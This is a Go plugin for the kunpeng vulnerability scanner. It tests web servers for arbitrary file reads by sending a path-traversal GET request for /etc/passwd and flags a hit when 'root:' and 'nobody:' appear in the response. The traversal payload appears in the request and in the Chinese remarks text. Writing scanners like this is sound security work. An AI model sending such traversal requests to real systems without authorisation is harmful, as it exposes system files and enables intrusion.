package goplugin

import (
	"net/http"
	"strings"
	"github.com/opensec-cn/kunpeng/util"
	"github.com/opensec-cn/kunpeng/plugin"
)

type webServerLFI struct {
	info   plugin.PluginInfo
	result []plugin.PluginInfo
}

func init() {
	plugin.Regist("web", &webServerLFI{})
}
func (d *webServerLFI) Init() plugin.PluginInfo{
	d.info = plugin.PluginInfo{
		Name:    "WebServer 任意文件读取",
		Remarks: "web容器对请求处理不当，可能导致可以任意文件读取(例：GET ../../../../../etc/passwd)",
		Level:   1,
		Type:    "LFI",
		Author:   "wolf",
        References: plugin.References{
        	URL: "https://www.secpulse.com/archives/4276.html",
        	CVE: "",
        },
	}
	return d.info
}
func (d *webServerLFI) GetResult() []plugin.PluginInfo {
	return d.result
}
func (d *webServerLFI) Check(URL string, meta plugin.TaskMeta) bool {
	if meta.System == "windows" {
		return false
	}
	request, err := http.NewRequest("GET", URL+"/../../../../../../../../etc/passwd", nil)
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "root:") && strings.Contains(resp.ResponseRaw, "nobody:") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
